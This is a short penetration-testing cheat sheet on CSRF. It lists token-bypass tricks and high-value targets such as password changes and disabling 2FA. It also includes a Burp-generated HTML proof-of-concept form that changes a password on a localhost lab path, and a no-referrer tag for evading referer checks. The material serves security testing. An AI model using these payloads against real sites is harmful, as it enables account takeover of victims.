# CSRF:

- No CSRF token –> exploit using IMG tag.
- Change the request to GET from POST
- Delete the Token
- remove token parameter from request
- Not Validating USED TOKEN
- DOUBLE COOKIE CHECK –> change with fake cookies to both
- Use second user’s unused Token
- AREAS to try on CSRF:
    1. Account Details change. (Email / username / security Question)
    2. Email and Password change if no old password needed
    3. Disable 2FA
    4. Disconnect social media account connected to thataccount. 5. Delete account
    5. Add comment to other person
    6. creating some new thing and modifying it
    7. remove items from the cart
    8. vote / unvote

## CSRF Code:

- In the Burp PRO , generate CSRF POC:
    1. Right Click on the Request.
    2. Engagement tools
    3. CSRF POC

```
<html>

<!-- CSRF PoC - generated by Burp Suite Professional -->

<body>

<script>history.pushState('', '', '/')</script>

<form action="http://127.0.0.1/vulnerabilities/csrf/">

<input type="hidden" name="password&#95;new" value="prince123" />

<input type="hidden" name="password&#95;conf" value="prince123" />

<input type="hidden" name="Change" value="Change" />

<input type="submit" value="Submit request" />

</form>

<meta name=”referrer” content=”no-referrer”>

</body>

</html>
```

## CSRF when the server is checking the referer header in the request:

https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy

- Add the following code in the HTML CSRF payload: `<meta name=”referrer” content=”no-referrer”>`

v

## References:

https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee

## Contributors:
- [Prince Prafull](https://twitter.com/princeprafull3)